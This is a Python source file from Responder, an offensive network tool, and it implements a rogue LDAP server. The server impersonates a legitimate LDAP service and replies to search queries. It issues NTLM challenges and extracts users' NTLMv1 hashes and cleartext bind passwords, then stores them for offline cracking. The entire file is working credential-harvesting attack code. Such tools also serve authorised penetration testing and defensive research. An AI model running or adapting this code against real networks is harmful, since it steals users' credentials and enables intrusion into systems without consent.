#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import struct
import settings

from SocketServer import BaseRequestHandler
from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge
from utils import *

def ParseSearch(data):
	Search1 = re.search('(objectClass)', data)
	Search2 = re.search('(?i)(objectClass0*.*supportedCapabilities)', data)
	Search3 = re.search('(?i)(objectClass0*.*supportedSASLMechanisms)', data)

	if Search1:
		return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
	if Search2:
		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
	if Search3:
		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))

def ParseLDAPHash(data, client):
	SSPIStart = data[42:]
	LMhashLen = struct.unpack('<H',data[54:56])[0]

	if LMhashLen > 10:
		LMhashOffset = struct.unpack('<H',data[58:60])[0]
		LMHash       = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		
		NthashLen    = struct.unpack('<H',data[64:66])[0]
		NthashOffset = struct.unpack('<H',data[66:68])[0]
		NtHash       = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		
		DomainLen    = struct.unpack('<H',data[72:74])[0]
		DomainOffset = struct.unpack('<H',data[74:76])[0]
		Domain       = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		
		UserLen      = struct.unpack('<H',data[80:82])[0]
		UserOffset   = struct.unpack('<H',data[82:84])[0]
		User         = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')

		WriteHash    = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+settings.Config.NumChal

		SaveToDb({
			'module': 'LDAP',
			'type': 'NTLMv1',
			'client': client,
			'user': Domain+'\\'+User,
			'hash': NtHash,
			'fullhash': WriteHash,
		})
	
	if LMhashLen < 2 and settings.Config.Verbose:
		print text("[LDAP] Ignoring anonymous NTLM authentication")

def ParseNTLM(data,client):
	Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
	Search2 = re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data)

	if Search1:
		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9],NTLMSSPNtServerChallenge=settings.Config.Challenge)
		NTLMChall.calculate()
		return str(NTLMChall)

	if Search2:
		ParseLDAPHash(data,client)

def ParseLDAPPacket(data, client):
	if data[1:2] == '\x84':

		PacketLen        = struct.unpack('>i',data[2:6])[0]
		MessageSequence  = struct.unpack('<b',data[8:9])[0]
		Operation        = data[9:10]
		sasl             = data[20:21]
		OperationHeadLen = struct.unpack('>i',data[11:15])[0]
		LDAPVersion      = struct.unpack('<b',data[17:18])[0]
		
		if Operation == "\x60":

			UserDomainLen  = struct.unpack('<b',data[19:20])[0]
			UserDomain     = data[20:20+UserDomainLen]
			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]

			if AuthHeaderType == "\x80":
				PassLen   = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
				Password  = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]

				SaveToDb({
					'module': 'LDAP',
					'type': 'Cleartext',
					'client': client,
					'user': UserDomain,
					'cleartext': Password,
					'fullhash': UserDomain+':'+Password,
				})
			
			if sasl == "\xA3":
				Buffer = ParseNTLM(data,client)
				return Buffer
		
		elif Operation == "\x63":
			Buffer = ParseSearch(data)
			return Buffer
		
		else:
			if settings.Config.Verbose:
				print text('[LDAP] Operation not supported')

# LDAP Server class
class LDAP(BaseRequestHandler):
	def handle(self):
		try:
			while True:
				self.request.settimeout(0.5)
				data = self.request.recv(8092)
				Buffer = ParseLDAPPacket(data,self.client_address[0])

				if Buffer:
					self.request.send(Buffer)
		
		except socket.timeout:
			pass
